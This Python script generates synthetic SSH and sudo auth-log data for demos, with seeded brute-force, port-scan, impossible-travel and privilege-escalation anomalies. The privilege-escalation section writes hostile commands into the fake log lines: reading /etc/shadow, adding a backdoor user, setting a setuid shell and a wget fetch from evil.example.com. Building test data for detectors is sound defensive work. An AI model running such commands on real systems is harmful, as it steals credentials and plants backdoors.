"""
Generates realistic synthetic auth.log-style demo data with seeded anomalies.

Run: python demo_data.py
Outputs: demo_logs.log
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

OUTPUT_FILE = "demo_logs.log"
NUM_NORMAL_EVENTS = 400
SEED = 42

random.seed(SEED)

# Realistic IPs
NORMAL_IPS = [
    "10.0.1.15", "10.0.1.20", "10.0.1.33", "10.0.1.44",
    "192.168.1.100", "192.168.1.101", "192.168.1.102",
]
ATTACKER_IPS = [
    "185.220.101.34",  # Known Tor exit node style
    "91.240.118.222",  # Eastern European block
    "45.33.32.156",    # Scanner-style
]
NORMAL_USERS = ["alice", "bob", "charlie", "deploy", "www-data", "admin"]
BRUTE_FORCE_USERS = ["root", "admin", "test", "guest", "postgres", "oracle", "ubuntu"]

HOST = "web-prod-01"
BASE_TIME = datetime(2026, 4, 14, 2, 0, 0, tzinfo=timezone.utc)


def _fmt_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def _normal_event(t: datetime) -> str:
    """Generate a normal auth log event."""
    kind = random.choices(
        ["accepted", "session_open", "session_close", "cron"],
        weights=[0.3, 0.25, 0.25, 0.2],
    )[0]

    ip = random.choice(NORMAL_IPS)
    user = random.choice(NORMAL_USERS)
    ts = _fmt_ts(t)

    if kind == "accepted":
        port = random.choice([22, 22, 22, 443, 8080])
        return f"{ts} {HOST} sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {ip} port {port} ssh2"
    elif kind == "session_open":
        return f"{ts} {HOST} systemd-logind[{random.randint(100,999)}]: session opened for user {user}"
    elif kind == "session_close":
        return f"{ts} {HOST} systemd-logind[{random.randint(100,999)}]: session closed for user {user}"
    else:
        return f"{ts} {HOST} CRON[{random.randint(10000,99999)}]: pam_unix(cron:session): session opened for user {user}"


def _brute_force_burst(start: datetime, count: int = 30) -> list[str]:
    """Rapid-fire failed login attempts from a single attacker IP."""
    ip = random.choice(ATTACKER_IPS)
    lines = []
    t = start
    for _ in range(count):
        user = random.choice(BRUTE_FORCE_USERS)
        port = random.randint(40000, 65535)
        ts = _fmt_ts(t)
        lines.append(
            f"{ts} {HOST} sshd[{random.randint(1000,9999)}]: Failed password for invalid user {user} from {ip} port {port} ssh2"
        )
        t += timedelta(seconds=random.uniform(0.5, 3.0))
    return lines


def _privilege_escalation_burst(start: datetime) -> list[str]:
    """Suspicious sudo activity from a compromised account."""
    user = "www-data"  # Low-privilege account doing root things
    lines = []
    t = start
    commands = [
        "/bin/bash", "/usr/bin/passwd root", "/bin/cat /etc/shadow",
        "/usr/sbin/useradd backdoor", "/bin/chmod 4755 /tmp/shell",
        "/usr/bin/wget http://evil.example.com/payload.sh",
    ]
    for cmd in commands:
        ts = _fmt_ts(t)
        lines.append(
            f"{ts} {HOST} sudo[{random.randint(1000,9999)}]: {user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND={cmd}"
        )
        t += timedelta(seconds=random.uniform(2, 8))
    return lines


def _port_scan_burst(start: datetime) -> list[str]:
    """Connection attempts across many ports from one IP."""
    ip = ATTACKER_IPS[2]
    lines = []
    t = start
    ports = random.sample(range(1, 1024), 20)
    for port in ports:
        ts = _fmt_ts(t)
        lines.append(
            f"{ts} {HOST} sshd[{random.randint(1000,9999)}]: Failed password for root from {ip} port {port} ssh2"
        )
        t += timedelta(seconds=random.uniform(0.2, 1.0))
    return lines


def _impossible_travel_events(start: datetime) -> list[str]:
    """Same user logging in from geographically impossible IPs in short span."""
    user = "admin"
    lines = []
    # Login from US-style IP
    ts1 = _fmt_ts(start)
    lines.append(
        f"{ts1} {HOST} sshd[{random.randint(1000,9999)}]: Accepted password for {user} from 72.14.192.5 port 22 ssh2"
    )
    # 2 minutes later, login from Eastern European IP
    t2 = start + timedelta(minutes=2)
    ts2 = _fmt_ts(t2)
    lines.append(
        f"{ts2} {HOST} sshd[{random.randint(1000,9999)}]: Accepted password for {user} from 91.240.118.222 port 22 ssh2"
    )
    # Rapid activity from the second IP
    t = t2 + timedelta(seconds=5)
    for _ in range(8):
        ts = _fmt_ts(t)
        lines.append(
            f"{ts} {HOST} sshd[{random.randint(1000,9999)}]: Failed password for root from 91.240.118.222 port {random.randint(40000,65535)} ssh2"
        )
        t += timedelta(seconds=random.uniform(0.5, 2.0))
    return lines


def generate() -> str:
    all_lines: list[tuple[datetime, str]] = []

    # Normal traffic spread over 2 hours
    for i in range(NUM_NORMAL_EVENTS):
        t = BASE_TIME + timedelta(seconds=random.uniform(0, 7200))
        all_lines.append((t, _normal_event(t)))

    # Anomaly 1: Brute force burst at ~30min mark
    bf_start = BASE_TIME + timedelta(minutes=30)
    for line in _brute_force_burst(bf_start, count=35):
        # Parse the timestamp back to sort correctly
        all_lines.append((bf_start, line))
        bf_start += timedelta(seconds=random.uniform(0.5, 2.0))

    # Anomaly 2: Privilege escalation at ~55min mark
    pe_start = BASE_TIME + timedelta(minutes=55)
    for line in _privilege_escalation_burst(pe_start):
        all_lines.append((pe_start, line))
        pe_start += timedelta(seconds=random.uniform(2, 5))

    # Anomaly 3: Port scan at ~80min mark
    ps_start = BASE_TIME + timedelta(minutes=80)
    for line in _port_scan_burst(ps_start):
        all_lines.append((ps_start, line))
        ps_start += timedelta(seconds=random.uniform(0.2, 1.0))

    # Anomaly 4: Impossible travel at ~100min mark
    it_start = BASE_TIME + timedelta(minutes=100)
    for line in _impossible_travel_events(it_start):
        all_lines.append((it_start, line))
        it_start += timedelta(seconds=random.uniform(1, 5))

    # Sort by timestamp and extract lines
    all_lines.sort(key=lambda x: x[0])
    output = "\n".join(line for _, line in all_lines)
    return output


if __name__ == "__main__":
    log_content = generate()
    with open(OUTPUT_FILE, "w") as f:
        f.write(log_content)
    total = log_content.count("\n") + 1
    print(f"Generated {total} log entries → {OUTPUT_FILE}")
